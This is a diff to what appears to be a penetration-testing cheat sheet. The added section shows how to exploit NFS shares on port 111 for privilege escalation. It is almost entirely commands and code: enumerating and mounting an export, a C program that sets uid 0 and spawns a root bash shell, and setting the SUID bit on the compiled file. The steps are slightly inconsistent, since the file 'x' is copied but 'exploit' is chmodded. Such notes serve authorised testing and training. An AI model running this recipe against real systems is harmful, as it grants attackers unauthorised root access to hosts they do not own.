@@ -203,12 +203,34 @@ $ telnet [target]
 ### Remote Procedure Call - TCP 111
 
 Exploit NFS shares
-```
+```bash
 $ rpcinfo -p [ target IP ] | grep 'nfs'
 $ rpcbind -p [ target IP ]                        # Look for NFS-shares
 $ showmount -e [ target IP ]                      # show mountable directories
 $ mount -t nfs [target IP]:/ /mnt -o nolock       # mount remote share to your local machine
 $ df -k                                           # show mounted file systems
+```
+
+Exploit NFS shares for privesc:
+```bash
+$ showmount -e 192.168.xx.53
+Export list for 192.168.xx.53:
+/shared 192.168.xx.0/255.255.255.0
+[root:~/Desktop]# mkdir /tmp/mymount
+/bin/mkdir: created directory '/tmp/mymount'
+[root:~/Desktop]# mount -t nfs 192.168.xx.53:/shared /tmp/mymount -o nolock
+[root:~/Desktop]# cat /root/Desktop/exploit.c
+#include <stdio.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0);
+setgid(0);
+system("/bin/bash");
+}
+gcc exploit.c -m32 -o exploit
+[root:/tmp/mymount]# cp /root/Desktop/x /tmp/mymount/
+[root:/tmp/mymount]# chmod u+s exploit
 ```
 
 Attack scenario: replace target SSH keys with your own
